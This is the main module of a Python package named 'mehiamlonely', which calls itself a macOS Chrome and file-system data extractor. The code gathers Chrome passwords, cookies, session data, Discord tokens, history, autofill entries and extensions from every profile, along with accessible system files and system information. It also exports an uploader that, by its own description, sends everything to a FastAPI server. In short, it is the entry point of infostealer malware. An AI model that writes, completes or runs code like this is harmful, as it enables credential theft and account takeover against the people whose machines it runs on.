
"""
mehiamlonely - macOS File System and Chrome Data Extractor
Main module for easy import and usage
"""

from .extractor import extract_all_data, ChromeDataExtractor, FileSystemExtractor
from .uploader import upload_all_data, DataUploader, create_sample_fastapi_server
from .cli import main as cli_main

__version__ = "0.1.0"
__author__ = "Your Name"
__description__ = "Extracts Chrome profiles, passwords, cookies, and system files, uploads to FastAPI server"

# Main functions for programmatic usage
def extract_chrome_data():
    """Extract Chrome passwords, cookies, session data, Discord tokens, and other browser data"""
    extractor = ChromeDataExtractor()
    profiles = extractor.get_chrome_profiles()
    
    chrome_data = {
        "profiles": [],
        "passwords": [],
        "cookies": [],
        "sessions": [],
        "discord_tokens": [],
        "history": [],
        "local_storage": [],
        "autofill_data": [],
        "extensions": []
    }
    
    for profile in profiles:
        profile_data = extractor.extract_session_data(profile)
        passwords = extractor.extract_passwords(profile)
        cookies = extractor.extract_cookies(profile)
        history = extractor.extract_chrome_history(profile)
        discord_tokens = extractor.extract_discord_tokens(profile)
        local_storage = extractor.extract_local_storage(profile)
        autofill_data = extractor.extract_autofill_data(profile)
        extensions = extractor.extract_extensions(profile)
        
        chrome_data["profiles"].append(profile_data)
        chrome_data["passwords"].extend(passwords)
        chrome_data["cookies"].extend(cookies)
        chrome_data["sessions"].append(profile_data)
        chrome_data["discord_tokens"].extend(discord_tokens)
        chrome_data["history"].extend(history)
        chrome_data["local_storage"].extend(local_storage)
        chrome_data["autofill_data"].extend(autofill_data)
        chrome_data["extensions"].extend(extensions)
    
    # Remove duplicate tokens
    chrome_data["discord_tokens"] = list(set(chrome_data["discord_tokens"]))
    
    return chrome_data

def extract_system_files(max_files=1000):
    """Extract accessible system files"""
    fs_extractor = FileSystemExtractor()
    return fs_extractor.get_accessible_files(max_files)

def extract_system_info():
    """Extract system information"""
    fs_extractor = FileSystemExtractor()
    return fs_extractor.get_system_info()

def mehiamlonely():
    """Main function - can be called programmatically"""
    return extract_all_data()

# Export main functions
__all__ = [
    'extract_all_data',
    'extract_chrome_data', 
    'extract_system_files',
    'extract_system_info',
    'upload_all_data',
    'DataUploader',
    'create_sample_fastapi_server',
    'mehiamlonely',
    'cli_main'
]
